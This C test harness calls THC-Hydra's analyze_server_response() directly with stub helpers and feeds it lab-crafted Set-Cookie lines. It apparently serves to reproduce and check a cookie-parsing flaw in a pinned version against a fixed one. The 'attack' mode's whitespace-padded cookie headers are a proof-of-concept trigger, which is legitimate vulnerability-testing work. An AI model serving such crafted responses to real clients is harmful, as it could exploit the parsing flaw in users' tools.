/*
 * hydra2shell direct-call harness.
 *
 * Includes the verbatim pinned analyze_server_response() body from
 * src/analyze-v9.7.c (or src/analyze-fixed.c) and supplies only the
 * minimal globals and helpers the function needs. The Set-Cookie lines
 * below are the lab-crafted server response; no external system is
 * contacted.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

int32_t success_cond = 0;
int32_t getcookie = 1;
int32_t auth_flag = 0;
int32_t redirected_flag = 0;
int32_t debug = 0;
char cookie[4096] = "";
char redirected_url_buff[2048] = "";
char *buf = NULL;
char *cond = "__MISHE_NEVER_MATCH__";

/* Lab-crafted HTTP response lines, selected by argv[1]. */
static const char *attack_lines[] = {
    "Set-Cookie:   aaa=1\r\n", /* jar becomes "  aaa=1" (two leading spaces) */
    "Set-Cookie:  aaa=2\r\n", /* tmpname " aaa=" matches jar at index 1 */
};
static const char *single_lines[] = {
    "Set-Cookie: aaa=1\r\n",
};
static const char *normal_lines[] = {
    "Set-Cookie: aaa=1\r\n",
    "Set-Cookie: aaa=2\r\n",
};
static const char *noeq_lines[] = {
    "Set-Cookie:   aaa\r\n",
};

static const char *const *lines;
static size_t nlines;
static size_t line_idx;

char *hydra_receive_line(int32_t s) {
  (void)s;
  if (line_idx >= nlines)
    return NULL;
  return strdup(lines[line_idx++]);
}

char *hydra_strcasestr(const char *haystack, const char *needle) {
  size_t n = strlen(needle);
  for (const char *p = haystack; *p; p++)
    if (strncasecmp(p, needle, n) == 0)
      return (char *)p;
  return NULL;
}

void hydra_report(FILE *f, const char *fmt, ...) {
  (void)f;
  (void)fmt;
}

int hydra_string_match(const char *s, const char *c) {
  return strstr(s, c) != NULL;
}

#include FUNC_FILE

int main(int argc, char **argv) {
  const char *mode = argc > 1 ? argv[1] : "attack";
  if (!strcmp(mode, "attack")) {
    lines = attack_lines;
    nlines = sizeof(attack_lines) / sizeof(attack_lines[0]);
  } else if (!strcmp(mode, "single")) {
    lines = single_lines;
    nlines = sizeof(single_lines) / sizeof(single_lines[0]);
  } else if (!strcmp(mode, "normal")) {
    lines = normal_lines;
    nlines = sizeof(normal_lines) / sizeof(normal_lines[0]);
  } else if (!strcmp(mode, "noeq")) {
    lines = noeq_lines;
    nlines = sizeof(noeq_lines) / sizeof(noeq_lines[0]);
  } else {
    fprintf(stderr, "unknown mode %s\n", mode);
    return 2;
  }
  int rc = analyze_server_response(0);
  printf("MODE=%s RC=%d COOKIE=%s\n", mode, rc, cookie);
  return rc < 0 ? 1 : rc;
}
